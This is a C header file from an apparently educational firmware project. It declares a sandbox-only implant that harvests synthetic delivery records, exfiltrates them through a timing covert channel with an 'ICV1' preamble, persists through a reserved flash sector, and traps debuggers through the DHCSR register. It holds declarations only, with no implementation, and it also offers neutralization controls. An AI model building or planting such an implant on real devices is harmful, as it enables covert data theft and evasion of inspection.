// MIT License
//
// Copyright (c) 2026 Kevin Thomas
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
//
// Author:  Kevin Thomas
// Email:   kevin@mytechnotalent.com
// GitHub:  https://github.com/mytechnotalent/smart-logistics-dropbox
// File:    implant.h
// Desc:    Declares the SANDBOX_ONLY FROSTLINE covert channel: the
//          synthetic delivery harvest, the ICV1 magic preamble and timing
//          side channel, the reserved-sector staging marker, and the
//          CoreDebug anti-debug trap. Compiled only under SANDBOX_ONLY.
// Created: 2026

#ifndef IMPLANT_H
#define IMPLANT_H

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>

/**
 * @brief Magic preamble that marks a FROSTLINE covert-channel frame.
 */
#define DROPBOX_IMPLANT_CHANNEL_MAGIC "ICV1"

/**
 * @brief Length in bytes of the ICV1 covert-channel magic preamble.
 */
#define DROPBOX_IMPLANT_CHANNEL_MAGIC_LEN 4u

/**
 * @brief Microseconds of covert timing spent per encoded payload byte.
 */
#define DROPBOX_IMPLANT_CHANNEL_BIT_US 250u

/**
 * @brief Marker byte written into the reserved flash sector.
 */
#define DROPBOX_IMPLANT_MARKER_BYTE 0xC7u

/**
 * @brief Offset of the reserved flash sector used by the staging marker.
 *
 * The final 4 KiB sector of the 4 MiB flash, well beyond the firmware.
 */
#define DROPBOX_IMPLANT_RESERVE_OFFSET 0x3FF000u

/**
 * @brief Reserved flash sector address used by the staging marker.
 */
#define DROPBOX_IMPLANT_RESERVE_ADDR 0x103FF000u

/**
 * @brief CoreDebug DHCSR register address used by the anti-debug trap.
 */
#define DROPBOX_IMPLANT_DHCSR_ADDR 0xE000EDF0u

/**
 * @brief CoreDebug DHCSR bit that reports an enabled debugger.
 */
#define DROPBOX_IMPLANT_DHCSR_DEBUGEN 0x00000001u

/**
 * @brief CoreDebug DHCSR bit that reports a halted core.
 */
#define DROPBOX_IMPLANT_DHCSR_HALT 0x00000002u

/**
 * @brief Number of staged synthetic delivery records held before wrapping.
 */
#define DROPBOX_IMPLANT_STAGE_SLOTS 8u

/**
 * @brief Staged delivery record length in bytes.
 *
 * A record is a little-endian 16-bit package identifier, an 8-bit attempt
 * count, and a little-endian 32-bit capture tick.
 */
#define DROPBOX_IMPLANT_RECORD_LEN 7u

/**
 * @brief Total length in bytes of the staging buffer.
 */
#define DROPBOX_IMPLANT_STAGE_LEN \
    (DROPBOX_IMPLANT_STAGE_SLOTS * DROPBOX_IMPLANT_RECORD_LEN)

/**
 * @brief Number of ticks between autonomous harvest and exfiltration.
 */
#define DROPBOX_IMPLANT_TICK_INTERVAL 4u

/**
 * @brief Maximum length in bytes of one covert-channel frame.
 */
#define DROPBOX_IMPLANT_FRAME_MAX \
    (DROPBOX_IMPLANT_CHANNEL_MAGIC_LEN + 1u + DROPBOX_IMPLANT_STAGE_LEN)

/**
 * @brief Initialize the implant and re-install from the reserved sector.
 *
 * On first run the implant writes its staging marker into the reserved
 * flash sector. On every later boot the marker is present, so the channel
 * is re-installed without any firmware change.
 *
 * @param void No parameters.
 * @return void
 */
void implant_init(void);

/**
 * @brief Advance the implant by one tick: autonomous harvest and exfil.
 *
 * @param void No parameters.
 * @return void
 */
void implant_tick(void);

/**
 * @brief Handle one inbound frame, harvesting and exfiltrating on the magic.
 *
 * @param frame Pointer to the inbound frame bytes.
 * @param len Number of inbound frame bytes.
 * @return void
 */
void implant_handle_command(const uint8_t *frame, size_t len);

/**
 * @brief Report whether the covert-channel payload handler is armed.
 *
 * @param void No parameters.
 * @return bool true when the covert-channel handler is armed.
 */
bool implant_armed(void);

/**
 * @brief Report whether a debug probe is attached via CoreDebug DHCSR.
 *
 * @param void No parameters.
 * @return bool true when C_DEBUGEN or C_HALT is set.
 */
bool implant_debug_attached(void);

/**
 * @brief Report whether synthetic delivery records are being harvested.
 *
 * @param void No parameters.
 * @return bool true when the harvest path is enabled and unprobed.
 */
bool implant_harvesting(void);

/**
 * @brief Report whether the covert exfiltration channel is active.
 *
 * @param void No parameters.
 * @return bool true when the channel may emit timing-encoded frames.
 */
bool implant_channel_active(void);

/**
 * @brief Report whether the reserved-sector staging marker is set.
 *
 * @param void No parameters.
 * @return bool true when the staging marker occupies the reserved sector.
 */
bool implant_infected(void);

/**
 * @brief Enable or disable the covert exfiltration channel.
 *
 * @param enabled True to allow exfiltration, false to neutralize it.
 * @return void
 */
void implant_set_channel(bool enabled);

/**
 * @brief Enable or disable synthetic delivery harvesting.
 *
 * @param enabled True to allow harvesting, false to neutralize it.
 * @return void
 */
void implant_set_harvesting(bool enabled);

/**
 * @brief Clear the staging buffer and every neutralization flag.
 *
 * @param void No parameters.
 * @return void
 */
void implant_neutralize(void);

/**
 * @brief Clear the staging buffer without touching the marker.
 *
 * @param void No parameters.
 * @return void
 */
void implant_stage_clear(void);

/**
 * @brief Return the number of staged synthetic delivery records.
 *
 * @param void No parameters.
 * @return size_t Number of staged records.
 */
size_t implant_stage_count(void);

/**
 * @brief Copy the staged records into a caller buffer.
 *
 * @param out Pointer to the destination buffer.
 * @param out_len Capacity of the destination buffer in bytes.
 * @return size_t Number of staged bytes copied, or zero when too small.
 */
size_t implant_stage_read(uint8_t *out, size_t out_len);

#endif // IMPLANT_H
